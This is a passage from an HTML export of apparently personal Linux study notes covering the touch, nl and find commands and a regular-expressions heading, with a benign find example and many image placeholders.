level-3'>touch</h1><br/><p>The touch command has two functions: to create an empty file and to update the</p><p>modification and access timestamps of an existing file</p><p></p><p><img src="images/61-1.png" alt="images/61-1.png" /> </p><p></p></div><div class='page'><h1 class='title level-3'>nl</h1><br/><p>‚Äúnl‚Äù number lines</p><p></p><p>numbers the lines of output</p><p></p><p><img src="images/75-1.png" alt="images/75-1.png" /> </p></div><div class='page'><h1 class='title level-3'>Find</h1><br/><p>find [options] starting_point criteria action</p><p>The starting_point is the directory where the search will start. The criteria is</p><p>what to search for, and the action is what to do with the results.</p><p></p><p></p><p><img src="images/77-1.png" alt="images/77-1.png" /> </p><p><img src="images/77-2.png" alt="images/77-2.png" /> </p><p></p><p><img src="images/77-3.png" alt="images/77-3.png" /> </p><p></p><p><img src="images/77-4.png" alt="images/77-4.png" /> </p><p></p><p>example: find /home -maxdepth 2 -mount -name &quot;*.pdf&quot; -exec ls -l {} \; -exec file {} \; </p><p><img src="images/77-5.png" alt="images/77-5.png" /> </p><p></p><p>Output:</p><p></p><p><img src="images/77-6.png" alt="images/77-6.png" /></p><p></p><p></p><p><img src="images/77-7.png" alt="images/77-7.png" /> </p></div><div class='page'><h1 class='title level-3'>Regular Expressions</h1><br/><p><img src="images/78-1.png" alt="images/78-1.png" /> </p><p><img src="images/78-2.png" alt="images/78-2.png" /> </p><p></p><p><img src="images/78-3.png" alt="images/78-3.png" /> </p></div><div class='page'><h1 class='title level-2'>Filesystem</h1><br/><p><img src="images/56-1.png" alt="images/56-1.png" /> </p></div>
</body>
</html>
